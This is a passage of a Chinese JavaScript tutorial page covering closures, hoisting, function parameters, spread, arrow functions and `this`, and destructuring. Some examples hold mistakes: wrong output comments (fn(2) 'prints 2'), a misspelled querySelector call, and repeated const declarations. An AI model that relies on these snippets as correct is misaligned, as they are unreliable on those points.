class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 例如实现累加的操作，需要累加数据不被随意修改</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">num</span>(<span class="params"></span>) &#123;</span><br><span class="line"><span class="keyword">let</span> count = <span class="number">1</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">fn</span>(<span class="params"></span>) &#123;</span><br><span class="line">count++</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`函数被调用<span class="subst">$&#123;count&#125;</span>次`</span>)</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> fn</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">const</span> result = <span class="title function_">num</span>() <span class="comment">// 相当于返回一个函数，即fn()</span></span><br><span class="line"><span class="title function_">result</span>() <span class="comment">// 打印2</span></span><br><span class="line"><span class="title function_">result</span>() <span class="comment">// 打印3</span></span><br><span class="line"><span class="comment">// 这样实现了累加的同时，count值不会被随意修改，实现了数据的私有</span></span><br></pre></td></tr></table></figure><h1 id="函数进阶"><a href="#函数进阶" class="headerlink" title="函数进阶"></a>函数进阶</h1><h2 id="变量提升"><a href="#变量提升" class="headerlink" title="变量提升"></a>变量提升</h2><p>变量提升是 JavaScript 中比较<strong>奇怪</strong>的现象，它允许在变量声明之前即被访问</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 访问变量 num</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(str + <span class="string">&#x27;件&#x27;</span>)  <span class="comment">// 打印出undefined件</span></span><br><span class="line"><span class="comment">// 声明变量 str</span></span><br><span class="line"><span class="keyword">var</span> num = <span class="number">10</span></span><br><span class="line"><span class="comment">// 只提升声明，不提升赋值，相当于在最前面声明var num，然后在此处赋值</span></span><br></pre></td></tr></table></figure><p>总结：</p><ol><li>变量在未声明即被访问时会报语法错误</li><li><strong>变量在声明之前即被访问，变量的值为</strong> <code>undefined</code></li><li><code>let</code> 声明的变量不存在变量提升，推荐使用 <code>let</code></li><li>变量提升出现在相同作用域当中</li><li>实际开发中推荐先声明再访问变量</li></ol><h2 id="函数提升"><a href="#函数提升" class="headerlink" title="函数提升"></a>函数提升</h2><p>函数提升与变量提升比较类似，是指函数在声明之前即可被调用。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 只提升函数声明，不提升函数调用</span></span><br><span class="line"><span class="title function_">foo</span>()</span><br><span class="line"><span class="keyword">function</span> <span class="title function_">foo</span>(<span class="params"></span>) &#123;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`函数在声明前被调用`</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_">bar</span>()</span><br><span class="line"><span class="keyword">var</span> bar = <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`函数表达式不存在提升`</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>总结：</p><ol><li>函数提升能够使函数的声明调用更灵活</li><li>函数表达式不存在提升的现象</li><li>函数提升出现在相同作用域当中</li></ol><h2 id="函数参数"><a href="#函数参数" class="headerlink" title="函数参数"></a>函数参数</h2><p>函数参数的使用细节，能够提升函数应用的灵活度。</p><h3 id="参数默认值"><a href="#参数默认值" class="headerlink" title="参数默认值"></a>参数默认值</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 设置参数默认值</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">sayHi</span>(<span class="params">name=<span class="string">&quot;小明&quot;</span>, age=<span class="number">18</span></span>) &#123;</span><br><span class="line"><span class="variable language_">document</span>.<span class="title function_">write</span>(<span class="string">`&lt;p&gt;大家好，我叫<span class="subst">$&#123;name&#125;</span>，我今年<span class="subst">$&#123;age&#125;</span>岁了。&lt;/p&gt;`</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 调用函数</span></span><br><span class="line"><span class="title function_">sayHi</span>();</span><br><span class="line"><span class="title function_">sayHi</span>(<span class="string">&#x27;小红&#x27;</span>);</span><br><span class="line"><span class="title function_">sayHi</span>(<span class="string">&#x27;小刚&#x27;</span>, <span class="number">21</span>);</span><br></pre></td></tr></table></figure><p>总结：</p><ol><li>声明函数时为形参赋值即为参数的默认值</li><li>如果参数未自定义默认值时，参数的默认值为 <code>undefined</code></li><li>调用函数时没有传入对应实参时，参数的默认值被当做实参传入</li></ol><h3 id="动态参数"><a href="#动态参数" class="headerlink" title="动态参数"></a>动态参数</h3><p><code>arguments</code> 是函数内部内置的伪数组变量，它包含了调用函数时传入的所有实参。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 求生函数，计算所有参数的和</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">sum</span>(<span class="params"></span>) &#123;</span><br><span class="line"><span class="comment">// console.log(arguments)</span></span><br><span class="line"><span class="keyword">let</span> s = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; <span class="variable language_">arguments</span>.<span class="property">length</span>; i++) &#123;</span><br><span class="line">s += <span class="variable language_">arguments</span>[i]</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(s)</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 调用求和函数</span></span><br><span class="line"><span class="title function_">sum</span>(<span class="number">5</span>, <span class="number">10</span>)<span class="comment">// 两个参数</span></span><br><span class="line"><span class="title function_">sum</span>(<span class="number">1</span>, <span class="number">2</span>, <span class="number">4</span>) <span class="comment">// 两个参数</span></span><br></pre></td></tr></table></figure><p>总结：</p><ol><li><code>arguments</code> 是一个伪数组，只存在于函数之中</li><li><code>arguments</code> 的作用是动态获取函数的实参</li><li>可以通过for循环依次得到传递过来的实参</li></ol><h3 id="剩余参数"><a href="#剩余参数" class="headerlink" title="剩余参数"></a>剩余参数</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">config</span>(<span class="params">baseURL, ...other</span>) &#123;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(baseURL) <span class="comment">// 得到 &#x27;http://baidu.com&#x27;</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(other)  <span class="comment">// other  得到 [&#x27;get&#x27;, &#x27;json&#x27;]</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 调用函数</span></span><br><span class="line"><span class="title function_">config</span>(<span class="string">&#x27;http://baidu.com&#x27;</span>, <span class="string">&#x27;get&#x27;</span>, <span class="string">&#x27;json&#x27;</span>);</span><br></pre></td></tr></table></figure><p>总结：</p><ol><li><code>...</code> 是语法符号，置于最末函数形参之前，用于获取<strong>多余</strong>的实参</li><li>借助 <code>...</code> 获取的剩余实参，是个真数组</li></ol><h3 id="展开运算符"><a href="#展开运算符" class="headerlink" title="展开运算符"></a>展开运算符</h3><p>展开运算符（<code>...</code>），将一个数组进行展开</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> arr = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>]</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(...arr) <span class="comment">// 1 2 3</span></span><br></pre></td></tr></table></figure><p><strong>典型的运用场景：求数组最大值（最小值）、合并数组等</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> arr = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>]</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title class_">Math</span>.<span class="title function_">max</span>(...arr)) <span class="comment">// 3</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title class_">Math</span>.<span class="title function_">min</span>(...arr)) <span class="comment">// 1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> arr2 = [<span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>]</span><br><span class="line"><span class="keyword">const</span> arr3 = [...arr, ...arr2]</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(arr3) <span class="comment">// [1, 2, 3, 4, 5, 6]</span></span><br></pre></td></tr></table></figure><p><code>...</code>运用区别：</p><ul><li>剩余参数：函数参数使用，得到真数组</li><li>展开运算符：数组中使用，数组展开</li></ul><h2 id="箭头函数"><a href="#箭头函数" class="headerlink" title="箭头函数"></a>箭头函数</h2><p>箭头函数是一种声明函数的简洁语法，它与普通函数并无本质的区别，差异性更多体现在语法格式上。</p><p><strong>使用场景</strong>：更适用于本来需要匿名函数的地方</p><h3 id="基本语法"><a href="#基本语法" class="headerlink" title="基本语法"></a>基本语法</h3><p><strong>基础写法：</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 普通写法</span></span><br><span class="line"><span class="keyword">const</span> fn = <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;我是普通函数&#x27;</span>)</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_">fn</span>()</span><br><span class="line"><span class="comment">// 箭头函数</span></span><br><span class="line"><span class="keyword">const</span> <span class="title function_">fn</span> = (<span class="params"></span>) =&gt; &#123;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;我是箭头函数&#x27;</span>)</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_">fn</span>()</span><br></pre></td></tr></table></figure><p><strong>只有一个参数可以省略小括号：</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 普通写法</span></span><br><span class="line"><span class="keyword">const</span> fn = <span class="keyword">function</span> (<span class="params">x</span>) &#123;</span><br><span class="line"><span class="keyword">return</span> x + x</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 箭头函数</span></span><br><span class="line"><span class="keyword">const</span> <span class="title function_">fn</span> = x =&gt; &#123;</span><br><span class="line"><span class="keyword">return</span> x + x</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title function_">fn</span>(<span class="number">2</span>)) <span class="comment">// 打印2</span></span><br></pre></td></tr></table></figure><p><strong>如果函数体只有一行，可以写在一行上，并且无需写return返回：</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 普通写法</span></span><br><span class="line"><span class="keyword">const</span> fn = <span class="keyword">function</span> (<span class="params">x, y</span>) &#123;</span><br><span class="line"><span class="keyword">return</span> x + y</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 箭头函数</span></span><br><span class="line"><span class="keyword">const</span> <span class="title function_">fn</span> = (<span class="params">x, y</span>) =&gt; x + y</span><br><span class="line"></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title function_">fn</span>(<span class="number">1</span>, <span class="number">2</span>)) <span class="comment">// 打印3</span></span><br></pre></td></tr></table></figure><p><strong>箭头函数可以直接返回一个对象：</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 普通写法</span></span><br><span class="line"><span class="keyword">const</span> fn = <span class="keyword">function</span> (<span class="params">uname</span>) &#123;</span><br><span class="line"><span class="keyword">return</span> &#123;<span class="attr">uname</span>: uname&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 箭头函数</span></span><br><span class="line"><span class="keyword">const</span> <span class="title function_">fn</span> = uname =&gt; (&#123;<span class="attr">uname</span>: uname&#125;)</span><br><span class="line"></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title function_">fn</span>(<span class="string">&#x27;周杰伦&#x27;</span>)) <span class="comment">// &#123;uname: &#x27;周杰伦&#x27;&#125;</span></span><br></pre></td></tr></table></figure><h3 id="箭头函数参数"><a href="#箭头函数参数" class="headerlink" title="箭头函数参数"></a>箭头函数参数</h3><ol><li>普通函数有<code>arguments</code>动态函数</li><li>箭头函数没有<code>arguments</code>动态函数，但是有剩余函数<code>...args</code></li></ol><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="title function_">getSum</span> = (<span class="params">...args</span>) =&gt; &#123;</span><br><span class="line"><span class="keyword">let</span> sum = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; args.<span class="property">length</span>; i++) &#123;</span><br><span class="line">sum += args[i]</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> sum</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title function_">getSum</span>(<span class="number">2</span>, <span class="number">3</span>)) <span class="comment">// 5</span></span><br></pre></td></tr></table></figure><h3 id="箭头函数this"><a href="#箭头函数this" class="headerlink" title="箭头函数this"></a>箭头函数this</h3><p>在箭头函数出现之前，每一个新函数根据自己是被如何调用的来定义这个函数的<code>this</code>值。</p><p>箭头函数不会创建自己的this，它只会从<strong>自己的作用域的上一层沿用的</strong><code>this</code>。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 以前this的指向：  谁调用的这个函数，this 就指向谁</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="variable language_">this</span>)  <span class="comment">// window</span></span><br><span class="line"><span class="comment">// 普通函数</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">fn</span>(<span class="params"></span>) &#123;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="variable language_">this</span>)  <span class="comment">// window</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="variable language_">window</span>.<span class="title function_">fn</span>()</span><br><span class="line"><span class="comment">// 对象方法里面的this</span></span><br><span class="line"><span class="keyword">const</span> obj = &#123;</span><br><span class="line"><span class="attr">name</span>: <span class="string">&#x27;andy&#x27;</span>,</span><br><span class="line"><span class="attr">sayHi</span>: <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="variable language_">this</span>)  <span class="comment">// obj</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">obj.<span class="title function_">sayHi</span>()</span><br><span class="line"></span><br><span class="line"><span class="comment">// 箭头函数的this  是上一层作用域的this 指向</span></span><br><span class="line"><span class="keyword">const</span> <span class="title function_">fn</span> = (<span class="params"></span>) =&gt; &#123;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="variable language_">this</span>)  <span class="comment">// window</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_">fn</span>()</span><br><span class="line"><span class="comment">// 对象方法箭头函数 this</span></span><br><span class="line"><span class="keyword">const</span> obj = &#123;</span><br><span class="line"><span class="attr">uname</span>: <span class="string">&#x27;pink老师&#x27;</span>,</span><br><span class="line"><span class="attr">sayHi</span>: <span class="function">() =&gt;</span> &#123;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="variable language_">this</span>)  <span class="comment">// window</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">obj.<span class="title function_">sayHi</span>()</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> obj = &#123;</span><br><span class="line"><span class="attr">uname</span>: <span class="string">&#x27;pink老师&#x27;</span>,</span><br><span class="line"><span class="attr">sayHi</span>: <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="variable language_">this</span>)  <span class="comment">// obj</span></span><br><span class="line"><span class="keyword">let</span> i = <span class="number">10</span></span><br><span class="line"><span class="keyword">const</span> <span class="title function_">count</span> = (<span class="params"></span>) =&gt; &#123;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="variable language_">this</span>)  <span class="comment">// obj ，沿用上一级的this</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_">count</span>()</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">obj.<span class="title function_">sayHi</span>()</span><br></pre></td></tr></table></figure><ul><li>在开发中，使用箭头函数需要考虑this值，事件回调函数使用箭头函数时，this为全局的window，因此DOM事件回调函数为了简便，一般不推荐使用箭头函数</li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// DOM节点</span></span><br><span class="line"><span class="keyword">const</span> btn = <span class="variable language_">document</span>.<span class="title function_">querySeletor</span>(.<span class="string">&#x27;btn&#x27;</span>)</span><br><span class="line"><span class="comment">// 箭头函数，此时this指向window</span></span><br><span class="line">btn.<span class="title function_">addEventListener</span>(<span class="string">&#x27;click&#x27;</span>, <span class="function">() =&gt;</span> &#123;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="variable language_">this</span>)</span><br><span class="line">&#125;)</span><br><span class="line"><span class="comment">// 普通函数，此时this指向DOM对象</span></span><br><span class="line">btn.<span class="title function_">addEventListener</span>(<span class="string">&#x27;click&#x27;</span>, <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="variable language_">this</span>)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><h1 id="解构赋值"><a href="#解构赋值" class="headerlink" title="解构赋值"></a>解构赋值</h1><p>解构赋值是一种快速为变量赋值的简洁语法，本质上仍然是为变量赋值，分为<strong>数组解构</strong>、<strong>对象解构</strong>两大类型。</p><h2 id="数组解构"><a href="#数组解构" class="headerlink" title="数组解构"></a>数组解构</h2><p>数组解构是将数组的单元值快速批量赋值给一系列变量的简洁语法，如下代码所示：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 普通的数组</span></span><br><span class="line"><span class="keyword">let</span> arr = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>]</span><br><span class="line"><span class="comment">// 批量声明变量 a b c </span></span><br><span class="line"><span class="comment">// 同时将数组单元值 1 2 3 依次赋值给变量 a b c</span></span><br><span class="line"><span class="keyword">let</span> [a, b, c] = arr</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(a); <span class="comment">// 1</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(b); <span class="comment">// 2</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(c); <span class="comment">// 3</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 典型用法：交换两个变量</span></span><br><span class="line"><span class="keyword">let</span> x = <span class="number">1</span></span><br><span class="line"><span class="keyword">let</span> y = <span class="number">2</span>; <span class="comment">// 必须有分号</span></span><br><span class="line">[y, x] = [x, y]</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(x) <span class="comment">// 2</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(y) <span class="comment">// 1</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 按需导入，可忽略部分参数</span></span><br><span class="line"><span class="keyword">const</span> [a, , c, d] = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>]</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(a) <span class="comment">// 1</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(c) <span class="comment">// 3</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(d) <span class="comment">// 4</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 支持多维数组的结果</span></span><br><span class="line"><span class="keyword">const</span> [a, b] = [<span class="number">1</span>, [<span class="number">2</span>, <span class="number">3</span>]]</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(b) <span class="comment">// [2, 3]</span></span><br><span class="line"><span class="keyword">const</span> [a, [b, c]] = [<span class="number">1</span>, [<span class="number">2</span>, <span class="number">3</span>]]</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(a) <span class="comment">// 1</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(b) <span class="comment">// 2</span></span><br></pre></td></tr></table></figure><p>总结：</p><ol><li>赋值运算符 <code>=</code> 左侧的 <code>[]</code> 用于批量声明变量，右侧数组的单元值将被赋值给左侧的变量</li><li>变量的顺序对应数组单元值的位置依次进行赋值操作</li><li>变量的数量大于单元值数量时，多余的变量将被赋值为 <code>undefined</code></li><li>变量的数量小于单元值数量时，可以通过 <code>...</code> 获取剩余单元值，但只能置于最末位</li><li>允许初始化变量的默认值，且只有单元值为 <code>undefined</code> 时默认值才会生效</li></ol><p>注意_需要前面加分号的情况：</p><ol><li>立即执行函数</li></ol><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">(<span class="keyword">function</span> <span class="title function_">t</span>(<span class="params"></span>) &#123;&#125;)();</span><br><span class="line"><span class="comment">// 或者</span></span><br><span class="line">;(<span class="keyword">function</span> <span class="title function_">t</span>(<span class="params"></span>) &#123;&#125;)()</span><br></pre></td></tr></table></figure><ol start="2"><li>数组解构</li></ol><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//数组开头的，特别是前面有语法的一定要注意加分号</span></span><br><span class="line">;[b, a] = [a, b]</span><br></pre></td></tr></table></figure><h2 id="对象解构"><a href="#对象解构" class="headerlink" title="对象解构"></a>对象解构</h2><p>对象解构是将对象属性和方法快速批量赋值给一系列变量的简洁语法，如下代码所示：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 普通对象</span></span><br><span class="line"><span class="keyword">const</span> user = &#123;</span><br><span class="line"><span class="attr">name</span>: <span class="string">&#x27;小明&#x27;</span>,</span><br><span class="line"><span class="attr">age</span>: <span class="number">18</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="comment">// 批量声明变量 name age</span></span><br><span class="line"><span class="comment">// 同时将数组单元值 小明  18 依次赋值给变量 name  age</span></span><br><span class="line"><span class="keyword">const</span> &#123;name, age&#125; = user</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(name) <span class="comment">// 小明</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(age) <span class="comment">// 18</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 允许给定新的变量名</span></span><br><span class="line"><span class="keyword">const</span> &#123;<span class="attr">name</span>: uname, age&#125; = user</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(uname) <span class="comment">// 小明</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 支持数组对象解构，也支持多级对象解构</span></span><br><span class="line"><span class="keyword">const</span> user = [</span><br><span class="line">&#123;</span><br><span class="line"><span class="attr">name</span>: <span class="string">&#x27;小明&#x27;</span>,</span><br><span class="line"><span class="attr">age</span>: <span class="number">18</span></span><br><span class="line">&#125;</span><br><span class="line">];</span><br><span class="line"><span class="keyword">const</span> [&#123;name, age&#125;] = user</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(name, age) <span class="comment">// &#123;name: &#x27;小明&#x27;， age: 6&#125;</span></span><br></pre></td></tr></table></figure><p>总结：</p><ol><li>赋值运算符 <code>=</code> 左侧的 <code>&#123;&#125;</code> 用于批量声明变量，右侧对象的属性值将被赋值给左侧的变量</li><li>对象属性的值将被赋值给与属性名相同的变量</li><li>对象中找不到与变量名一致的属性时变量值为 <code>undefined</code></li><li>允许初始化变量的默认值，属性不存在或单元值为 <code>undefined</code> 时默认值才会生效</li></ol><p>注：支持多维解构赋值</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span 